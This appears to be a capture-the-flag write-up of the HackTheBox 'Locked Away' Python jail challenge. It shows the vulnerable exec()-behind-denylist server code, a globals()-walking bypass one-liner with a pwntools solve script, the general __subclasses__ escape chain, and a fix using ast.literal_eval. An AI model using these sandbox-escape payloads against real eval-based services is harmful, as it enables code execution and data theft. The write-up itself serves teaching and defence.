---
title: "Locked Away"
date: 2026-11-24 09:00:00 -0500
categories: [HackTheBox, Challenges, Misc]
tags: [hackthebox, challenge, misc, pyjail, sandbox-escape, code-injection, cwe-95]
description: "A Very Easy Misc challenge: a Python prompt runs exec() on your input behind a substring denylist. The program already defines a function that reads the flag — call it without ever typing a banned word, quote, or bracket."
---

## Overview

`Locked Away` is a Very Easy HackTheBox **Misc** challenge — a classic Python "jail" (pyjail). You connect to a network service that reads one line and runs it through `exec()`, but only after rejecting your input if it contains any of a long list of banned substrings. The twist: the program itself already defines a helper that reads and prints the flag. The whole challenge is reaching that helper without typing any forbidden character.

## The technique

The server loop looks like this:

```python
def open_chest():
    with open('flag.txt', 'r') as f:
        print(f.read())

blacklist = ['import','os','sys','breakpoint','flag','txt','read','eval','exec',
             'dir','print','subprocess','[',']','echo','cat','>','<','"',"'",'open']

while True:
    command = input('The chest lies waiting... ')
    if any(b in command for b in blacklist):
        print('Invalid command!'); continue
    try:
        exec(command)
    except Exception:
        print('You have been locked away...'); exit(1337)
```

`open_chest()` literally reads the flag — but its name contains `open`, which is banned. And with `"`, `'`, `[`, and `]` all blacklisted, you can't type a string literal or subscript anything either. So `open_chest`, `globals()['open_chest']`, and `__import__("os")` are all off the table.

The key insight: the denylist only inspects **your input string**, not the code already running in the process. This is a textbook [eval injection](https://cwe.mitre.org/data/definitions/95.html) ([CWE-95](https://cwe.mitre.org/data/definitions/95.html)) — untrusted input reaches `exec()`, "guarded" only by a substring blacklist. Blacklists for code-execution sinks always lose: there is one more object the author forgot. Here, `exec` runs at module scope, so `open_chest` sits in `globals()`. We don't need to *name* it — just *reach* it.

## Solution

`globals()` holds every module-level name: `banner` (a string), `open_chest` (a function), `blacklist` (a list), `command` (a string), `__builtins__` (a module). The only **callable** value is `open_chest`. So we loop the values and call the callable:

```python
for x in list(globals().values()): callable(x) and x()
```

No banned word, no string literal, no subscript — pure object navigation. Two details make or break it:

- **`list(...)` snapshots the values first.** `[ ]` are blacklisted so you can't write a list literal, but `list()` (parentheses) is allowed. The snapshot is mandatory: `exec` at module scope inserts the loop variable `x` into `globals()` on every iteration, so iterating `globals().values()` **live** raises `RuntimeError: dictionary changed size during iteration` — the `except` fires and you get *"You have been locked away..."* instead of the flag.
- **`callable(x)` filters out the non-functions.** Without it, the loop tries to "call" the `banner` string first, raises `TypeError`, and you're locked away again.

Solve script (`solve.py`) — send the one-liner, print the flag line:

```python
#!/usr/bin/env python3
import sys
from pwn import remote, context
context.log_level = "error"

HOST = sys.argv[1]
PORT = int(sys.argv[2])

payload = b"for x in list(globals().values()): callable(x) and x()"

io = remote(HOST, PORT)
io.recvuntil(b"waiting... ")
io.sendline(payload)
data = io.recvall(timeout=5).decode(errors="replace")
io.close()

for line in data.splitlines():
    if "HTB{" in line:
        print(line.strip()); break
```

Running it against the live instance prints the flag:

```bash
python3 solve.py <host> <port>
# HTB{...}
```

## Why it worked

The program tried to sandbox `exec()` with a denylist of substrings. That is not a security boundary — it only blocks the *spelling* of an attack, not its *effect*. Every name the filter forgot (and every object already in scope) is still reachable through Python's object graph. The challenge made the gap obvious by pre-defining a flag-reading function, but the same class of bypass applies whenever attacker input reaches a dynamic evaluator.

## Fix / defense

Don't sandbox `exec`/`eval` with a blacklist — remove the dynamic-evaluation sink entirely. If you must accept structured input, parse it instead of executing it:

```python
import ast
value = ast.literal_eval(command)   # only literals; raises on any code
```

Or dispatch through an explicit allowlist of named handlers. Genuinely untrusted code should run only inside an OS-level isolated sandbox that holds no secrets. For other pyjails where no helper is handed to you, the general escape is to walk `().__class__.__base__.__subclasses__()` to reach `os` via `.__init__.__globals__` — which is exactly why a denylist can never contain this weakness.
